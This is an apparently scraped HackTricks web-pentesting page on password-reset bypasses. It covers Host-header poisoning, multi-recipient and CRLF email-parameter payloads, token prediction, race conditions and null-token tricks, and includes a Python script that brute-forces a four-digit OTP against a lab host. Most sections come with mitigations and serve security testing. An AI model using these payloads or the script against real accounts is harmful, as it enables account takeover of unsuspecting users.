---
title: "Reset/Forgotten Password Bypass"
source: hacktricks.wiki
source_url: https://hacktricks.wiki/pentesting-web/reset-password.html
fetched_at: 2026-09-20T09:50:19Z
license: unspecified
category: web
---

## **Password Reset Token Leak Via Referrer**

**Password Reset Token Leak Via Referrer**

- The HTTP referer header may leak the password reset token if it’s included in the URL. This can occur when a user clicks on a third-party website link after requesting a password reset.
- **Impact** : Potential account takeover if a third party receives and redeems the leaked reset token.
- **Exploitation** : To check if a password reset token is leaking in the referer header,**request a password reset** to your email address and**click the reset link** provided.**Do not change your password** immediately. Instead,**navigate to a third-party website** (like Facebook or Twitter) while**intercepting the requests using Burp Suite** . Inspect the requests to see if the**referer header contains the password reset token** , as this could expose sensitive information to third parties.<sup>[\[1\]](#references)</sup><sup>[\[2\]](#references)</sup><sup>[\[3\]](#references)</sup>

## **Password Reset Poisoning**

**Password Reset Poisoning**

- Attackers may manipulate the Host header during password reset requests to point the reset link to a malicious site.
- **Impact** : Leads to potential account takeover by leaking reset tokens to attackers.<sup>[\[4\]](#references)</sup>
- **Exploitation tips** :
  - Test not only `Host` , but also override headers such as`X-Forwarded-Host` ,`Forwarded` ,`X-Host` , and`X-Original-Host` . Reverse proxies and middleware sometimes build the reset URL from those values instead of from the canonical host.
  - If the reset request contains parameters such as `baseurl` ,`return_to` ,`redirect_uri` ,`redirect_url` ,`next` , or a tenant/domain selector, point them to an attacker-controlled host and inspect the email template.
  - Try the poisoning payload on the first request **and** on “resend reset link” endpoints. In several real cases only one of the two paths was vulnerable.
- Test not only
- **Mitigation Steps** :
  - Validate the Host header against an allow-list of permitted domains.
  - Use secure, server-side methods to generate absolute URLs.
  - **Patch** : Use`$_SERVER['SERVER_NAME']` to construct password reset URLs instead of`$_SERVER['HTTP_HOST']` .

## **Password Reset By Manipulating Email Parameter**

**Password Reset By Manipulating Email Parameter**

Attackers can manipulate the password reset request by adding additional email parameters to divert the reset link.[\[5\]](#references)[\[6\]](#references)[\[7\]](#references)[\[8\]](#references)

- Add attacker email as second parameter using &

```
POST /resetPassword
[...]
email=victim@email.com&email=attacker@email.com
```
- Add attacker email as second parameter using %20

```
POST /resetPassword
[...]
email=victim@email.com%20email=attacker@email.com
```
- Add attacker email as second parameter using |

```
POST /resetPassword
[...]
email=victim@email.com|email=attacker@email.com
```
- Add attacker email as second parameter using cc

```
POST /resetPassword
[...]
email="victim@mail.tld%0a%0dcc:attacker@mail.tld"
```
- Add attacker email as second parameter using bcc

```
POST /resetPassword
[...]
email="victim@mail.tld%0a%0dbcc:attacker@mail.tld"
```
- Add attacker email as second parameter using ,

```
POST /resetPassword
[...]
email="victim@mail.tld",email="attacker@mail.tld"
```
- Add attacker email as second parameter in json array

```
POST /resetPassword
[...]
{"email":["victim@mail.tld","attacker@mail.tld"]}
```
- Convert a normal form submission to JSON and try nested arrays/objects (some frameworks type-coerce a single-recipient field into multiple recipients)

```
{
  "user": {
    "email": ["victim@mail.tld", "attacker@mail.tld"]
  }
}
```
- Try framework-specific multi-value formats

```
POST /resetPassword HTTP/1.1
Content-Type: application/x-www-form-urlencoded
email[]=victim@mail.tld&email[]=attacker@mail.tld
```
- Also try comma-separated values inside a single string (`victim@mail.tld,attacker@mail.tld` ) and content-type conversions (`x-www-form-urlencoded` -> JSON,`multipart/form-data` -> JSON) because some mailers or validators split recipients late in the pipeline.
- **Mitigation Steps** :
  - Properly parse and validate email parameters server-side.
  - Reject arrays / repeated parameters when a single recipient is expected.
  - Cast the final recipient to a string before passing it to the mailer and re-validate after any normalization step.

## **Changing the Email and Password of Any User Through API Parameters**

- Attackers can modify email and password parameters in API requests to change account credentials.<sup>[\[9\]](#references)</sup>

```
POST /api/changepass
[...]
("form": {"email":"victim@email.tld","password":"12345678"})
```
- **Mitigation Steps** :
  - Ensure strict parameter validation and authentication checks.
  - Implement robust logging and monitoring to detect and respond to suspicious activities.

## **No Rate Limiting: Email Bombing**

**No Rate Limiting: Email Bombing**

- Lack of rate limiting on password reset requests can lead to email bombing, overwhelming the user with reset emails.<sup>[\[10\]](#references)</sup>
- **Mitigation Steps** :
  - Implement rate limiting based on IP address or user account.
  - Use CAPTCHA challenges to prevent automated abuse.

## **Find out How Password Reset Token is Generated**

**Find out How Password Reset Token is Generated**

- Understanding the pattern or method behind token generation can lead to predicting or brute-forcing tokens. Some options:
  - Based Timestamp
  - Based on the UserID
  - Based on email of User
  - Based on Firstname and Lastname
  - Based on Date of Birth
  - Based on Cryptography
- Also request several reset links in parallel and compare them. Identical tokens, deterministic increments, or “one-time” links that remain valid after first use usually indicate a race condition or a state machine bug.
- **Mitigation Steps** :
  - Use strong, cryptographic methods for token generation.
  - Ensure sufficient randomness and length to prevent predictability.
- **Tools** : Use Burp Sequencer to analyze the randomness of tokens, and Turbo Intruder / Burp Repeater group-send to test parallel issuance and reuse.

## **Guessable UUID**

**Guessable UUID**

- If UUIDs (version 1) are guessable or predictable, attackers may brute-force them to generate valid reset tokens. Check:

- **Mitigation Steps** :
  - Use GUID version 4 for randomness or implement additional security measures for other versions.
- **Tools** : Use[guidtool](https://github.com/intruder-io/guidtool) for analyzing and generating GUIDs.

## **Response Manipulation: Replace Bad Response With Good One**

- Manipulating HTTP responses to bypass error messages or restrictions.<sup>[\[11\]](#references)</sup>
- **Mitigation Steps** :
  - Implement server-side checks to ensure response integrity.
  - Use secure communication channels like HTTPS to prevent man-in-the-middle attacks.

## **Using Expired Token**

**Using Expired Token**

- Testing whether expired tokens can still be used for password reset.
- Check both the final reset endpoint and any intermediate “validate token” endpoint. Some applications reject the token on the UI step but still accept it on the JSON/API step that actually changes the password.
- **Mitigation Steps** :
  - Implement strict token expiration policies and validate token expiry server-side.

## **Race / Reuse of One-Time Reset Tokens**

**Race / Reuse of One-Time Reset Tokens**

- Some applications invalidate reset tokens only after the password update finishes, or only in one worker/process. This makes supposedly one-time links reusable when the same token is submitted concurrently.
- Practical checks:
  - Open the same reset link in two browsers and submit both almost at the same time.
  - Send two `POST /reset` requests in parallel with the same token but different passwords.
  - Complete the password change once, then replay the exact final request before following any redirect chain.
- If two different passwords are accepted or the same token works twice, you likely found a race condition in token invalidation.
- **Mitigation Steps** :
  - Invalidate the token atomically before or during the password update transaction.
  - Ensure the token is single-use across all workers and replicas.

## **Brute Force Password Reset Token**

**Brute Force Password Reset Token**

- Attempting to brute-force the reset token using tools like Burpsuite and IP-Rotator to bypass IP-based rate limits.
- **Mitigation Steps** :
  - Implement robust rate-limiting and account lockout mechanisms.
  - Monitor for suspicious activities indicative of brute-force attacks.

## **Try Using Your Token**

**Try Using Your Token**

- Testing if an attacker’s reset token can be used in conjunction with the victim’s email.<sup>[\[12\]](#references)</sup>
- This usually appears when the application validates the token and the target account independently. Typical vulnerable patterns:
  - Step 1 (`/forgot-password` ) issues a token tied to the attacker account.
  - Step 2 (`/reset-password` ) accepts both`token` and`email` /`userId` /`username` from the client.
  - The backend checks that the token exists, but uses the attacker-controlled identifier to decide **which** password to change.
- Step 1 (
- Practical mutations to test:
  - Keep your valid token but replace `email` ,`userId` ,`username` ,`login` , or`accountId` with the victim’s value.
  - Move the token between query string, JSON body, and headers while changing the victim identifier in the other location.
  - If the reset page first calls a “validate token” endpoint and then a separate “change password” endpoint, change the victim identifier only in the second request.
- Keep your valid token but replace
- **Mitigation Steps** :
  - Bind the token to the account on the server side and derive the target user exclusively from that token.
  - Do not trust any account identifier submitted alongside the token unless it matches the token owner.

## **Password Reset Token Disclosure in API Responses**

**Password Reset Token Disclosure in API Responses**

- Some APIs return the reset token (`resetToken` ,`tempToken` ,`recoveryCode` ) directly in the forgot-password response or in a secondary polling/debug endpoint.<sup>[\[13\]](#references)</sup>
- This is usually an immediate ATO: trigger a reset for the victim, capture the token from the API response, then call the final reset endpoint without mailbox access.
- Also inspect GraphQL responses, mobile APIs, websocket notifications, batch endpoints, and verbose error messages for leaked token values or token expiry metadata.

```
POST /api/v1/account/forgot-password HTTP/1.1
Content-Type: application/json
{"email":"victim@example.com"}
HTTP/1.1 200 OK
Content-Type: application/json
{"tempToken":"4f89...","tokenExpiry":"<expiry-timestamp>","user":{"email":"victim@example.com"}}
```
## **Missing “token was generated” check**

**Missing “token was generated” check**

- A subtle variant appears when the reset endpoint compares the attacker-supplied token with the value stored in the database, but never verifies that a reset flow was actually started.
- If the default stored value is `NULL` or an empty string, try sending`null` ,`""` , omitting the field entirely, or using the string`"null"` .
- This bug is especially interesting on recently created accounts or on accounts where the application initializes `tokenExpiry` during account creation instead of during the reset flow.

```
{
  "user": {
    "email": "victim@example.com",
    "tempToken": null,
    "password": "NewP@ssw0rd!"
  }
}
```
- **Mitigation Steps** :
  - Ensure that tokens are bound to the user session or other user-specific attributes.
  - Reject reset attempts unless the server recorded a live reset request for that account.

## **Session Invalidation in Logout/Password Reset**

**Session Invalidation in Logout/Password Reset**

- Ensuring that sessions are invalidated when a user logs out or resets their password.
- **Mitigation Steps** :
  - Implement proper session management, ensuring that all sessions are invalidated upon logout or password reset.

## **Reset Token Expiration**

**Reset Token Expiration**

- Reset tokens should have an expiration time after which they become invalid.
- **Mitigation Steps** :
  - Set a reasonable expiration time for reset tokens and strictly enforce it server-side.

## **OTP rate limit bypass by changing your session**

**OTP rate limit bypass by changing your session**

- If the site tracks failed OTP attempts only in the current session and uses a weak OTP (four digits or fewer), rotating the session may bypass the attempt counter and enable brute force.
  -
**exploitation** :
    - just request a new session token after getting blocked by the server.
  -
**Example** code that exploits this bug by randomly guessing the OTP (when you change the session the OTP will change as well, and so we will not be able to sequentially bruteforce it!):```
  # Authentication bypass by password reset
  # by coderMohammed
  import requests
  import random
  from time import sleep

  headers = {
      "User-Agent": "Mozilla/5.0 (iPhone14,3; U; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19A346 Safari/602.1",
      "Cookie": "PHPSESSID=mrerfjsol4t2ags5ihvvb632ea"
  }
  url = "http://10.10.12.231:1337/reset_password.php"
  logout = "http://10.10.12.231:1337/logout.php"
  root = "http://10.10.12.231:1337/"

  parms = dict()
  ter = 0
  phpsessid = ""

  print("[+] Starting attack!")
  sleep(3)
  print("[+] This might take around 5 minutes to finish!")

  try:
          while True:
                  parms["recovery_code"] = f"{random.randint(0, 9999):04}" # random number from 0 - 9999 with 4 d
                  parms["s"] = 164 # not important it only efects the frontend
                  res = requests.post(url, data=parms, allow_redirects=True, verify=False, headers=headers)

                  if ter == 8: # follow number of trails
                          out = requests.get(logout,headers=headers) # log u out
                          mainp = requests.get(root) # gets another phpssid (token)

                          cookies = out.cookies # extract the sessionid
                          phpsessid = cookies.get('PHPSESSID')
                          headers["cookies"]=f"PHPSESSID={phpsessid}" #update the headers with new session

                          reset = requests.post(url, data={"email":"tester@hammer.thm"}, allow_redirects=True, verify=False, headers=headers) # sends the email to change the password for
                          ter = 0 # reset ter so we get a new session after 8 trails
                  else:
                          ter += 1
                          if(len(res.text) == 2292): # this is the length of the page when u get the recovery code correctly (got by testing)
                                  print(len(res.text)) # for debug info
                                  print(phpsessid)

                                  reset_data = { # here we will change the password to somthing new
                                  "new_password": "D37djkamd!",
                                  "confirm_password": "D37djkamd!"
                                  }
                                  reset2 = requests.post(url, data=reset_data, allow_redirects=True, verify=False, headers=headers)

                                  print("[+] Password has been changed to:D37djkamd!")
                                  break
  except Exception as e:
          print("[+] Attck stopped")
```
-

## [Arbitrary password reset via skipOldPwdCheck (pre-auth)](#arbitrary-password-reset-via-skipoldpwdcheck-pre-auth)

Some implementations expose a password change action that calls the password-change routine with skipOldPwdCheck=true and does not verify any reset token or ownership. If the endpoint accepts an action parameter like change_password and a username/new password in the request body, an attacker can reset arbitrary accounts pre-auth.[\[14\]](#references)

Vulnerable pattern (PHP):

```
// hub/rpwd.php
RequestHandler::validateCSRFToken();
$RP = new RecoverPwd();
$RP->process($_REQUEST, $_POST);
// modules/Users/RecoverPwd.php
if ($request['action'] == 'change_password') {
  $body = $this->displayChangePwd($smarty, $post['user_name'], $post['confirm_new_password']);
}
public function displayChangePwd($smarty, $username, $newpwd) {
  $current_user = CRMEntity::getInstance('Users');
  $current_user->id = $current_user->retrieve_user_id($username);
  // ... criteria checks omitted ...
  $current_user->change_password('oldpwd', $_POST['confirm_new_password'], true, true); // skipOldPwdCheck=true
  emptyUserAuthtokenKey($this->user_auth_token_type, $current_user->id);
}
```
Exploitation request (concept):

```
POST /hub/rpwd.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded
action=change_password&user_name=admin&confirm_new_password=NewP@ssw0rd!
```
Mitigations:

- Always require a valid, time-bound reset token bound to the account and session before changing a password.
- Never expose skipOldPwdCheck paths to unauthenticated users; enforce authentication for regular password changes and verify the old password.
- Invalidate all active sessions and reset tokens after a password change.

## [Registration-as-Password-Reset (Upsert on Existing Email)](#registration-as-password-reset-upsert-on-existing-email)

Some applications implement the signup handler as an upsert. If the email already exists, the handler silently updates the user record instead of rejecting the request. When the registration endpoint accepts a minimal JSON body with an existing email and a new password, it effectively becomes a pre-auth password reset without any ownership verification allowing full account takeover.[\[15\]](#references)

Pre-auth ATO PoC (overwriting an existing user’s password):

```
POST /parents/application/v4/admin/doRegistrationEntries HTTP/1.1
Host: www.target.tld
Content-Type: application/json
{"email":"victim@example.com","password":"New@12345"}
```
## [References](#references)

Learn & practice AWS Hacking:**HackTricks Training AWS Red Team Expert (ARTE)**

Learn & practice GCP Hacking: **HackTricks Training GCP Red Team Expert (GRTE)**

Learn & practice Az Hacking: **HackTricks Training Azure Red Team Expert (AzRTE)**

Browse the [**full HackTricks Training catalog**](https://hacktricks-training.com/courses/).

## Support HackTricks

- Check the
[**subscription plans**](https://github.com/sponsors/carlospolop)!
**Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f), the [**telegram group**](https://t.me/peass), **follow** [**@hacktricks_live**](https://twitter.com/hacktricks_live) on **X/Twitter**, or check the [**LinkedIn page**](https://www.linkedin.com/company/hacktricks/) and [**YouTube channel**](https://www.youtube.com/@hacktricks_LIVE).
**Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
